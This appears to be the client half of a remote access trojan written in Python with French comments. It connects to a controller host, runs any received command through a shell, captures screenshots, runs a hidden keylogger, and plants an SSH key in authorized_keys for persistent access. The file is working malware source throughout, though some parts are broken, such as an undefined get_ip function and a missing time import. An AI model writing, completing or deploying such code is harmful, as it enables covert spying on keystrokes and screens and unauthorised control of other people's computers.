import socket
import subprocess
import os 
import paramiko
from pynput import keyboard
import threading
import pyautogui
from PIL import Image


# ========== COMMANDES PERSONNALISÉES ==========

# COMMANDE : screenshot

def screenshot():
    try: 
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.jpg", "JPEG")
        return "Capture d'écran sauvegardée en format .jpg sous 'screenshot.jpg'."
    except Exception as e:
        return f"Erreur screenshot : {e}"


# COMMANDE : keylogger

pressed_keys = set()
text = ""

def start_keylogger_thread():
    thread = threading.Thread(target=start_keylogger, daemon=True)
    thread.start()
    return "Keylogger démarré en arrière-plan."

def start_keylogger():
    global text
    current_dir = os.getcwd()
    log_file_path = os.path.join(current_dir, "keylog.txt")

    if os.path.exists(log_file_path):
        os.remove(log_file_path)

    def write_to_file(data):
        with open(log_file_path, "a") as f:
            f.write(data)
            f.flush()

    def on_press(key):
        global text
        try:
            if key not in pressed_keys:
                pressed_keys.add(key)

                if key == keyboard.Key.enter:
                    text += "\n"
                elif key == keyboard.Key.tab:
                    text += "\t"
                elif key == keyboard.Key.space:
                    text += " "
                elif key == keyboard.Key.backspace:
                    text = text[:-1]
                elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift):
                    pass
                elif key == keyboard.Key.esc:
                    return False  # stop listener
                else:
                    text += str(key).strip("'")

                write_to_file(text)
                time.sleep(0.01)
        except Exception as e:
            write_to_file(f"[Erreur] {e}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()




# COMMANDE : generate_ssh_keypair
def generate_ssh_keypair(passphrase="test",
                         private_key_path="id_rsa",
                         public_key_path="id_rsa.pub"):
    try:
        authorized_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
        ssh_dir = os.path.expanduser("~/.ssh")
        
        # Générer la paire de clés
        private_key = paramiko.RSAKey.generate(2048)
        private_key.write_private_key_file(private_key_path, password=passphrase)
        public_key = private_key.get_name() + " " + private_key.get_base64()

        # Sauvegarder la clé publique
        with open(public_key_path, "w") as public_key_file:
            public_key_file.write(public_key)

        # Créer le dossier .ssh s'il n'existe pas
        if not os.path.exists(ssh_dir):
            os.makedirs(ssh_dir, mode=0o700)

        # Ajouter la clé dans authorized_keys si elle n'y est pas déjà
        if not os.path.exists(authorized_keys_path):
            open(authorized_keys_path, "w").close()
            os.chmod(authorized_keys_path, 0o600)

        with open(authorized_keys_path, "r+") as auth_file:
            existing_keys = auth_file.read()
            if public_key not in existing_keys:
                auth_file.write(public_key + "\n")

        return f"Clés générées : {private_key_path}, {public_key_path}"

    except Exception as e:
        return f"Erreur : {e}"


# COMMANDE : all
def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur exécution : {e}"



# ========== HANDLE ==========
 
def handle_command(cmd):
    if cmd == "get_ip":
        return get_ip()
    elif cmd == "generate_ssh_keypair":
        return generate_ssh_keypair()
    elif cmd == "start_keylogger":
        return start_keylogger_thread()
    elif cmd == "screenshot":
        return screenshot()
    else:
        return exec_cmd(cmd)





# ========== CLIENT MAIN ==========

HOST = '192.168.2.5'  # Remplacez par l'adresse IP du serveur
PORT = 12345

# Création du socket client
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

print(f"Connecté au serveur {HOST}:{PORT}")


# Échange des messages
try:
    while True:
        command = client_socket.recv(4096).decode()
        if command.strip().lower == "exit":
            client_socket.close()
            print("Connexion fermée.")
            break
        response = handle_command(command)
        client_socket.send(response.encode())
except Exception as e:
    print(f"Erreur côté client : {e}")
finally: 
    client_socket.close()







